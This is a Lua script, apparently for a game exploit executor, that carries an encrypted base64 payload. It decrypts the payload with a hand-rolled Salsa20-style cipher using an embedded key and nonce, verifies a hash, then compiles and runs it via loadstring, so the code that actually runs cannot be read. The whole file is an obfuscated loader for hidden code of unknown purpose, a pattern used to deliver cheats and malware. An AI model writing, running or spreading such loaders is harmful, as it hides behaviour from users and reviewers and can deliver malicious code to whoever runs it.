local _acm = pcall
local _cvk = nil
local _wiv = ""

local function _safeRun()
  local _b0 = "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"
  local _b1 = "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"
  local _b2 = "EiXa6rAy0sx6xwQaLuy0aWAKonry9Ks1Acc8Wqgkx/sRcmbb3C0uEmpwakwaM5ywef3a/GA2TbbTtxmjuM9n5BlzQ2BDwbZRMAVo7rk/KdYqIh+nrp+5xUgcNc8K+i0f0oh6t/t94UUFF/EUDnCEEGxa+R6yIIPP5OtsNy3/8mc07NKAKkOl0CvhIw6OkzsgUd0W6rKuowXqHcA7PluDaUvbDTM4/hITnKGYlhGO4xdgOkMCDhBvp7pEd/EYhN0D9lwvz6oXcalc+vZmI5D86all0uASXr35F86Yb60hlKjRYZajZSth51zwxlBmVVSgmmhahPu4P8ugr51DULWL8lQHUbtURxPpHo8DG47S+RYYsVDCwrHrofYaPS/XJoD7fuWRnIm3OeppH/JJMfNQnFEPL3+biiagBzXgMUTvoEA5DYb8xGuSH5VOhYesOS2bOhaW6cZAvAFKI1FYsDXv9aFmAQ6GYJzWxpkxcnuNSC9N57JIfkvKWJ+WTb6OG01u6pHJxTR9"

  local _bitLib = bit32 or bit
  local _bXor, _bRotl

  if _bitLib and _bitLib.bxor and _bitLib.lrotate then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n) return _bitLib.lrotate(math.floor(tonumber(x) or 0) % 4294967296, math.floor(tonumber(n) or 0) % 32) end
  elseif _bitLib and _bitLib.bxor and _bitLib.lshift and _bitLib.rshift then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      return (_bitLib.lshift(x, n) + _bitLib.rshift(x, 32 - n)) % 4294967296
    end
  else
    _bXor = function(a, b)
      a = math.floor(tonumber(a) or 0) % 4294967296
      b = math.floor(tonumber(b) or 0) % 4294967296
      local r, m = 0, 1
      while a > 0 or b > 0 do
        if (a % 2) ~= (b % 2) then r = r + m end
        a = math.floor(a / 2); b = math.floor(b / 2); m = m * 2
      end
      return r
    end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      if n == 0 then return x end
      local p1 = math.floor(x / 2^(32 - n))
      local p2 = (x * 2^n) % 4294967296
      return (p1 + p2) % 4294967296
    end
  end

  local function _chr(v)
    return string.char(math.floor(tonumber(v) or 0) % 256)
  end

  local function _hex2bin(h)
    local o = {}
    for i = 1, #h, 2 do
      local v = tonumber(h:sub(i, i + 1), 16)
      if v then o[#o + 1] = _chr(v) end
    end
    return table.concat(o)
  end

  local function _b64d(s)
    local tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = {}
    for i = 1, #s, 4 do
      local a = (tbl:find(s:sub(i, i), 1, true) or 1) - 1
      local b = (tbl:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
      local c3 = s:sub(i + 2, i + 2)
      local c4 = s:sub(i + 3, i + 3)
      local c = c3 == "=" and 0 or (tbl:find(c3, 1, true) or 1) - 1
      local d = c4 == "=" and 0 or (tbl:find(c4, 1, true) or 1) - 1
      o[#o + 1] = _chr(a * 4 + math.floor(b / 16))
      if c3 ~= "=" then o[#o + 1] = _chr((b % 16) * 16 + math.floor(c / 4)) end
      if c4 ~= "=" then o[#o + 1] = _chr((c % 4) * 64 + d) end
    end
    return table.concat(o)
  end

  local _ovu = _hex2bin("0a469abfa60fbbdce7209b71d4c4f6f4bb3e9da7fb6afb0e6dd101c5498e1dfc")
  local _yrk = _hex2bin("82d026e877b35e29")

  if #_ovu ~= 32 or #_yrk ~= 8 then
    _cvk = "invalid key/nonce"
    return
  end

  local SIG = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574}

  local function _block(k32, n32, ctr_lo, ctr_hi)
    local s = {
      SIG[1], k32[1], k32[2], k32[3], k32[4], SIG[2], n32[1], n32[2],
      ctr_lo, ctr_hi, SIG[3], k32[5], k32[6], k32[7], k32[8], SIG[4]
    }
    local o = {}
    for i = 1, 16 do o[i] = s[i] end

    local function qr(a, b, c2, d)
      s[b] = _bXor(s[b], _bRotl((s[a] + s[d]) % 4294967296, 7))
      s[c2] = _bXor(s[c2], _bRotl((s[b] + s[a]) % 4294967296, 9))
      s[d] = _bXor(s[d], _bRotl((s[c2] + s[b]) % 4294967296, 13))
      s[a] = _bXor(s[a], _bRotl((s[d] + s[c2]) % 4294967296, 18))
    end

    for _ = 1, 10 do
      qr(1, 5, 9, 13); qr(6, 10, 14, 2); qr(11, 15, 3, 7); qr(16, 4, 8, 12)
      qr(1, 2, 3, 4); qr(6, 7, 8, 5); qr(11, 12, 9, 10); qr(16, 13, 14, 15)
    end

    local out = {}
    for i = 1, 16 do
      local v = (s[i] + o[i]) % 4294967296
      v = math.floor(tonumber(v) or 0)
      out[#out + 1] = _chr(v % 256)
      out[#out + 1] = _chr(math.floor(v / 256) % 256)
      out[#out + 1] = _chr(math.floor(v / 65536) % 256)
      out[#out + 1] = _chr(math.floor(v / 16777216) % 256)
    end
    return table.concat(out)
  end

  local k32, n32 = {}, {}
  for i = 1, 8 do
    local p = (i - 1) * 4 + 1
    k32[i] = string.byte(_ovu, p)
           + string.byte(_ovu, p + 1) * 256
           + string.byte(_ovu, p + 2) * 65536
           + string.byte(_ovu, p + 3) * 16777216
  end
  for i = 1, 2 do
    local p = (i - 1) * 4 + 1
    n32[i] = string.byte(_yrk, p)
           + string.byte(_yrk, p + 1) * 256
           + string.byte(_yrk, p + 2) * 65536
           + string.byte(_yrk, p + 3) * 16777216
  end

  local raw = _b64d(table.concat({_b0, _b1, _b2}))
  local dec = {}
  local counter = 0
  local acc = {}

  for pos = 1, #raw, 64 do
    local lo = counter % 4294967296
    local hi = math.floor(counter / 4294967296) % 4294967296
    local block = _block(k32, n32, lo, hi)
    counter = counter + 1
    for i = 1, 64 do
      local idx = pos + i - 1
      if idx > #raw then break end
      acc[#acc + 1] = _chr(_bXor(string.byte(raw, idx), string.byte(block, i)))
    end
    if #acc >= 4096 then
      dec[#dec + 1] = table.concat(acc)
      acc = {}
    end
  end
  if #acc > 0 then dec[#dec + 1] = table.concat(acc) end

  _wiv = table.concat(dec)

  local h = 0
  for i = 1, #_wiv do
    h = (h * 16777619 + string.byte(_wiv, i)) % 4294967296
  end
  if h ~= 2602531776 then
    _cvk = "hash mismatch"
    return
  end

  local _load = loadstring or load
  if not _load and getfenv then
    local ok, f = pcall(getfenv)
    if ok and type(f) == "table" then _load = f.loadstring or f.load end
  end
  if not _load then
    _cvk = "no loadstring available in this executor"
    return
  end

  local _okTest, _compiledTest = _acm(_load, "return 2+2")
  if not _okTest or not _compiledTest then
    _cvk = "loadstring check failed"
    return
  end
  local _okRun, _res = _acm(_compiledTest)
  if not _okRun or _res ~= 4 then
    _cvk = "loadstring execution check failed"
    return
  end

  local _okComp, _fn = _acm(_load, _wiv)
  if not _okComp or not _fn then
    _cvk = "compilation failed"
    return
  end

  local _okExec, _execErr = _acm(_fn)
  if not _okExec then
    _cvk = "execution failed: " .. tostring(_execErr)
  end
end

local _okGlobal, _globalErr = _acm(_safeRun)
if not _okGlobal then
  warn("[obf] wrapper crashed: " .. tostring(_globalErr))
elseif _cvk then
  warn("[obf] " .. tostring(_cvk))
end
